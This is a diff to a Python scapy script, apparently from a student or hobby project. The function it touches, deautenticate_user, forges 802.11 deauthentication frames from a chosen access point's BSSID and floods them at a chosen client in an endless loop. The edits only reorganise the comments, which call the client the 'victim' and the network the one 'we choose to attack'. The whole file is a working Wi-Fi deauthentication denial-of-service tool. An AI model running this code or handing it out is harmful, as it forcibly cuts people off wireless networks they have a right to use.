@@ -5,13 +5,18 @@ from scapy.all import (
   sendp        # for sending packets
 )
 
+# input -> 
+# 1.choosen interface 
+# 2. mac addr of the wifi we choose to attack = bssid specifies the MAC address of the AP
+# 3.the client we choose to attack (that uses the network we attack ) = target_mac specifies that this packet will go to the victim's computer
 def deautenticate_user(iface: str, bssid: str, target_mac: str):
-    """
-    - addr1=target_mac specifies that this packet will go to the victim's computer
-    - addr2=bssid specifies the MAC address of the AP 
-    - addr3=bssid is the same as addr2
-    """
-    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
-    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
-    while True:
-      sendp(frame, iface=iface, inter=0.100 , verbose = 0)
+ 
+  dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
+  #creating the frame of the packet with reason 7 for deautenticte 
+  #Radiotap is a standard for 802.11 frame injection and reception
+  frame = RadioTap()/dot11/Dot11Deauth(reason=7)
+  #sending deautenticate packets to the victim using scapy 
+  #The inter(framegap - IFG) is a sleep -we need time to build our packet 
+  #we used verbos= 0 to disable printing of sendp in console
+  while True:
+    sendp(frame, iface=iface, inter=0.100 , verbose = 0)
